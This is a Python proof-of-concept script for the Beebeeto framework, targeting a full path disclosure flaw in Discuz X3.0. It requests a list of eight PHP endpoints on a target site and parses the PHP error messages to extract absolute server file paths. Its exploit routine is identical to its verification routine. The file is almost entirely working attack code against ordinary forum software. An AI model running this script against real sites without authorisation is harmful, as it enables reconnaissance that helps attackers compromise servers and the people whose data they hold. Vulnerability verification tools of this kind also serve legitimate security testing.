#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import requests

from baseframe import BaseFrame

class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0114',
            'name': 'Discuz X3.0 full Path Disclosure Vulnerability POC',
            'author': 'JustForeg',
            'create_date': '2015-06-25',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Discuz',
            'vul_version': ['X3.0'],
            'type': 'Information Disclosure',
            'tag': ['Discuz信息泄漏漏洞', 'Information Disclosure', 'php'],
            'desc': 'discuz X3.0 存在多处绝对路径泄露',
            'references': ['N/A', ],
        },
    }

    @classmethod
    def verify(cls, args):
        payloads = [
            '/api/addons/zendcheck.php',
            '/api/addons/zendcheck52.php',
            '/api/addons/zendcheck53.php',
            '/source/plugin/mobile/api/1/index.php',
            '/source/plugin/mobile/extends/module/dz_digest.php',
            '/source/plugin/mobile/extends/module/dz_newpic.php',
            '/source/plugin/mobile/extends/module/dz_newreply.php',
            '/source/plugin/mobile/extends/module/dz_newthread.php',
        ]
        args['poc_ret']['file_path'] = []
        pathinfo = re.compile(r' in <b>(.*)</b> on line')
        for payload in payloads:
            verify_url = args['options']['target'] + payload
            if args['options']['verbose']:
                print '[*] Request URL: ' + verify_url
                print '[*] GET: ' + payload
            req = requests.get(verify_url)
            match = pathinfo.findall(req.content)
            if match:
                args['success'] = True
                args['poc_ret']['file_path'].append(match[0])
        if not args['poc_ret']['file_path']:
            args['poc_ret'].pop('file_path')
        return args


    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())